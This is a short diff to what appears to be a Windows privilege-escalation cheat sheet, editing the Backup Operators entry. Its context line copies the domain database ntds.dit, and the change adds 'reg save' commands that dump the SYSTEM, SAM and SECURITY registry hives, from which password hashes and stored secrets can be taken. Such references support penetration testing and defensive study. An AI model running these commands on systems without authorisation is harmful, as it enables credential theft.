@@ -2565,8 +2565,9 @@ PS C:\> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 - Backup Operators (SAM/SYSTEM)
 
 ```
-C:\> reg save HKLM\SYSTEM SYSTEM.SAV
-C:\> reg save HKLM\SAM SAM.SAV
+C:\> reg save HKLM\SYSTEM SYSTEM.SAVE
+C:\> reg save HKLM\SAM SAM.SAVE
+C:\> reg save HKLM\SECURITY SECURITY.SAVE
 ```
 
 - Event Log Readers
